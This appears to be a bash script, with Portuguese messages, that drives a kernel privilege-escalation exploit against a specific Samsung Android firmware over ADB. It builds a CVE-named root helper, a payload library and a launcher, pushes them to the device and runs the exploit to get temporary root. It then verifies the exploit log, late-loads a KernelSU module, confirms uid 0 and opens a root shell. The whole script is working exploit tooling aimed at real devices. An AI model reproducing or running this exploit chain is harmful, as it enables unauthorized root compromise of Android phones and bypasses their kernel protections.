#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ASSET_DIR="$SCRIPT_DIR/assets"
ADB="${ADB:-adb}"
REMOTE_HELPER=/data/local/tmp/ksu-helper
REMOTE_PAYLOAD=/data/local/tmp/payload.so
REMOTE_KSUD=/data/local/tmp/ksud-selected
REMOTE_KSUD_STAGE=/data/local/tmp/.ksud-stage
REMOTE_LAUNCHER=/data/local/tmp/stability-launcher
REMOTE_ASSETS=/data/local/tmp/simple-root

usage() {
  printf 'Uso: %s [serial-adb]\n' "${0##*/}"
  printf 'Executa o payload e carrega KernelSU sem temporizadores.\n'
}

if [[ "${1:-}" == -h || "${1:-}" == --help ]]; then
  usage
  exit 0
fi
if [[ $# -gt 1 ]]; then
  usage >&2
  exit 2
fi

PROJECT_DIR="$(cd -- "$SCRIPT_DIR/.." && pwd)"
KSUD_DIR="$PROJECT_DIR/kernelsu-next/out/kernelsu-next-afzh3-v3.4.0"
KSUD_SOURCE="$KSUD_DIR/ksud-next-v3.4.0"
KSUD_MODULE="$KSUD_DIR/android13-5.15_kernelsu.ko"
KSUD_ASSET=ksud-selected
KSUD_MODULE_ASSET=android13-5.15_kernelsu.ko
if [[ ! -s "$KSUD_SOURCE" || ! -s "$KSUD_MODULE" || ! -s "$KSUD_DIR/SHA256SUMS" ]]; then
  printf 'KernelSU Next AFZH3 com patch Samsung ausente: %s\n' "$KSUD_SOURCE" >&2
  printf 'O modulo generico v3.4.0 causou kernel panic neste aparelho.\n' >&2
  exit 1
fi
if ! (cd -- "$KSUD_DIR" && sha256sum --status -c SHA256SUMS); then
  printf 'Hashes do modulo Samsung e ksud nao conferem.\n' >&2
  exit 1
fi
if ! rg -a -q 'Samsung KDP task-scoped credential' "$KSUD_MODULE"; then
  printf 'Modulo sem suporte Samsung KDP: %s\n' "$KSUD_MODULE" >&2
  exit 1
fi
if [[ "$(modinfo -F vermagic "$KSUD_MODULE")" != '5.15.189-android13-8-33413713-abS918BXXSAFZH3 '* ]]; then
  printf 'Modulo nao corresponde ao kernel AFZH3: %s\n' "$KSUD_MODULE" >&2
  exit 1
fi
mkdir -p "$ASSET_DIR"
install -m 755 "$KSUD_SOURCE" "$ASSET_DIR/$KSUD_ASSET"
install -m 644 "$KSUD_MODULE" "$ASSET_DIR/$KSUD_MODULE_ASSET"

LAUNCHER_DIR="$PROJECT_DIR/stability-launcher"
ENGINE_DIR="$PROJECT_DIR/afzh3-open-payload-engine"
HELPER_BUILD_DIR="$SCRIPT_DIR/build"
HELPER_BINARY="$HELPER_BUILD_DIR/cve-2026-43499-root"
NDK_DIR="${ANDROID_NDK_HOME:-${ANDROID_NDK_ROOT:-$HOME/Android/Sdk/ndk/28.2.13676358}}"
LAUNCHER_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
if [[ ! -x "$LAUNCHER_CC" ]]; then
  NDK_DIR="$HOME/Android/Sdk/ndk/28.2.13676358"
  LAUNCHER_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
fi
if [[ ! -x "$LAUNCHER_CC" ]]; then
  printf 'Compilador Android ausente: %s\nDefina ANDROID_NDK_HOME para o NDK instalado.\n' "$LAUNCHER_CC" >&2
  exit 1
fi
printf '[*] Compilando stability-launcher para Android ARM64/API 35\n'
mkdir -p "$LAUNCHER_DIR/build" "$ASSET_DIR"
"$LAUNCHER_CC" -O2 -Wall -Wextra -Werror -fPIE \
  -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
  "$LAUNCHER_DIR/stability-launcher.c" \
  -pie -Wl,-z,relro,-z,now -o "$LAUNCHER_DIR/build/stability-launcher"
install -m 755 "$LAUNCHER_DIR/build/stability-launcher" "$ASSET_DIR/stability-launcher"

if [[ ! -f "$ENGINE_DIR/Makefile" ]]; then
  printf 'Engine AFZH3 ausente: %s\n' "$ENGINE_DIR" >&2
  exit 1
fi
printf '[*] Compilando engine AFZH3\n'
make -C "$ENGINE_DIR" -B -j2 so
install -m 755 "$ENGINE_DIR/build/payload.so" "$ASSET_DIR/payload.so"

# Build the open-source helper used for both UMH and KernelSU late-load.
printf '[*] Compilando helper AFZH3 de src/su_daemon.c\n'
make -B -C "$PROJECT_DIR" \
  "ANDROID_NDK_HOME=$NDK_DIR" \
  TARGET=dm3q-S918BXXSAFZH3 \
  "OUTDIR=$HELPER_BUILD_DIR" \
  "$HELPER_BINARY"
install -m 755 "$HELPER_BINARY" "$ASSET_DIR/ksu-helper"

assets=(ksu-helper payload.so "$KSUD_ASSET" "$KSUD_MODULE_ASSET" stability-launcher)
for asset in "${assets[@]}"; do
  [[ -s "$ASSET_DIR/$asset" ]] || {
    printf 'Asset ausente ou vazio: %s\n' "$ASSET_DIR/$asset" >&2
    exit 1
  }
done

if [[ $# -eq 1 ]]; then
  serial="$1"
else
  mapfile -t devices < <("$ADB" devices | awk 'NR > 1 && $2 == "device" { print $1 }')
  if [[ ${#devices[@]} -ne 1 ]]; then
    printf 'Esperava exatamente um dispositivo ADB autorizado; encontrei %d.\n' "${#devices[@]}" >&2
    "$ADB" devices -l >&2
    exit 1
  fi
  serial="${devices[0]}"
fi

adb_cmd=("$ADB" -s "$serial")
if ! "${adb_cmd[@]}" get-state 2>/dev/null | grep -qx device; then
  printf 'Dispositivo ADB indisponível ou não autorizado: %s\n' "$serial" >&2
  exit 1
fi

printf '[*] Copiando assets selecionados para %s\n' "$REMOTE_ASSETS"
"${adb_cmd[@]}" shell mkdir -p "$REMOTE_ASSETS"
for asset in "${assets[@]}"; do
  "${adb_cmd[@]}" push "$ASSET_DIR/$asset" "$REMOTE_ASSETS/$asset"
done

if root_identity="$("${adb_cmd[@]}" shell "/system/bin/su -c 'id'" 2>/dev/null)" &&
   grep -q 'uid=0(root)' <<<"$root_identity"; then
  printf '[+] Root já ativo: %s\n' "$root_identity"
  exit 0
fi

stage() {
  local name="$1" target="$2" source magic
  source="$REMOTE_ASSETS/$name"
  "${adb_cmd[@]}" shell rm -f "$target"
  "${adb_cmd[@]}" shell cp "$source" "$target"
  "${adb_cmd[@]}" shell chmod 755 "$target"
  magic="$("${adb_cmd[@]}" shell "head -c 4 '$target' | od -An -tx1 | tr -d ' \\n\\r'")"
  if [[ "$magic" != 7f454c46 ]]; then
    printf 'ELF magic inválido em %s: %s\n' "$target" "$magic" >&2
    exit 1
  fi
}

printf '[*] Preparando payload em %s\n' "$serial"
stage ksu-helper "$REMOTE_HELPER"
stage payload.so "$REMOTE_PAYLOAD"
stage stability-launcher "$REMOTE_LAUNCHER"
"${adb_cmd[@]}" shell rm -f /data/local/tmp/ksu-exploit.log

env_exports=""
if [[ -n "${SLIDE_P0_OFFSET:-}" ]]; then
  if [[ ! "$SLIDE_P0_OFFSET" =~ ^0x[0-9a-fA-F]+$ ]]; then
    printf 'SLIDE_P0_OFFSET inválido; use formato hexadecimal 0x...\n' >&2
    exit 2
  fi
  offset_value=$((SLIDE_P0_OFFSET))
  if (( offset_value > 0x1f8000 || (offset_value & 0x7fff) != 0 )); then
    printf 'SLIDE_P0_OFFSET fora dos limites/alinhamento aceitos pelo app.\n' >&2
    exit 2
  fi
  env_exports+="export SLIDE_P0_OFFSET='$SLIDE_P0_OFFSET'
"
fi
for var in FUTEX_WAIT_SEC KSNITCH_REPEAT KSNITCH_APPENDED PIPE_DETERMINISTIC RMG_TRACE_FILE; do
  val="${!var:-}"
  [[ -z "$val" ]] && continue
  if [[ ! "$val" =~ ^[0-9]+$ ]]; then
    printf '%s inválido; use inteiro.\n' "$var" >&2
    exit 2
  fi
  env_exports+="export $var='$val'
"
done
exploit_script="${env_exports}exec '$REMOTE_LAUNCHER' --payload '$REMOTE_PAYLOAD' --helper '$REMOTE_HELPER' 2>&1"

printf '[*] Executando payload\n'
exploit_log="$(mktemp)"
trap 'rm -f "$exploit_log"' EXIT
if ! "${adb_cmd[@]}" shell "$exploit_script" 2>&1 | tee "$exploit_log"; then
  printf 'Execução do payload falhou.\n' >&2
  exit 1
fi
if ! grep -Eq 'temporary-root-ready|exploit completed.*done=1 root=1' "$exploit_log"; then
  printf 'Payload não confirmou root temporário.\n' >&2
  exit 1
fi

stage "$KSUD_ASSET" "$REMOTE_KSUD"
stage "$KSUD_ASSET" "$REMOTE_KSUD_STAGE"
printf '[*] Carregando KernelSU\n'
if ! "${adb_cmd[@]}" shell "$REMOTE_HELPER" --late-load; then
  printf 'KernelSU --late-load falhou.\n' >&2
  exit 1
fi

printf '[*] Aguardando su (até 30s)\n'
root_identity=
root_command_ok=0
root_deadline=$((SECONDS + 30))
while :; do
  if root_identity="$("${adb_cmd[@]}" shell "/system/bin/su -c 'id'" 2>/dev/null)"; then
    root_command_ok=1
    if grep -q 'uid=0(root)' <<<"$root_identity"; then
      break
    fi
  fi
  if (( SECONDS >= root_deadline )); then
    break
  fi
  sleep 0.25
done
if ! grep -q 'uid=0(root)' <<<"$root_identity"; then
  if (( root_command_ok == 0 )); then
    printf 'Comando su -c id falhou após 30s.\n' >&2
  else
    printf 'Shell su não confirmou uid=0(root) após 30s.\n' >&2
  fi
  exit 1
fi
printf '[+] Root confirmado\n'
exec "${adb_cmd[@]}" shell su
